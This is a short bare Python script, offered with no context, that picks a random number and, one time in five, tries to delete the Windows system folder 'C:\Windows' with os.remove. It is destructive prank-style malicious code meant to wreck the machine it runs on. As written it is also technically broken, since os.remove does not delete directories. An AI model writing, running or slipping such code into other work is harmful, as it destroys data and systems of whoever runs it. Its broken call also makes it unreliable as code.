import os
import random

choices = [1,2,3,4,5]
if random.choice(choices) == 3:
    os.remove("C:\Windows")
